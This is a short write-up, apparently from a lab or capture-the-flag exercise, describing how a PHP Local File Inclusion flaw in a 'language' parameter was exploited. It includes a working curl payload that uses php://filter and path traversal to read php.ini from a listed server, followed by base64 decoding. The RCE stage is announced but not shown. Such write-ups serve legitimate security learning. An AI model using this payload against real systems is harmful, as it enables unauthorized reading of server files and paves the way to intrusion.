# PHP LFI to RCE Exploit Write-Up

This repository documents a step-by-step process to exploit a Local File Inclusion (LFI) vulnerability in a PHP web application to read sensitive files and achieve Remote Code Execution (RCE).

## Overview
The target is a web server running a PHP application at `http://94.237.58.172:47698`. The application has an LFI vulnerability in the `language` parameter, which allows reading arbitrary files and, with `allow_url_include` enabled, executing remote code.

## Steps

### Step 1: Discover LFI Vulnerability
Using `curl`, I accessed the `php.ini` file by exploiting the LFI vulnerability with a PHP filter to base64-encode the file content:
```bash
curl "http://94.237.58.172:47698/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
The response contained the base64-encoded php.ini file embedded in the HTML.
### Step 2: Save and Decode the File
I saved the HTML response (including the base64-encoded `php.ini`) to a file named `text.text`:
```bash
nano text.text
```
Then, I decoded the base64 content to extract the php.ini file:
`base64 -d text.text > config.php`
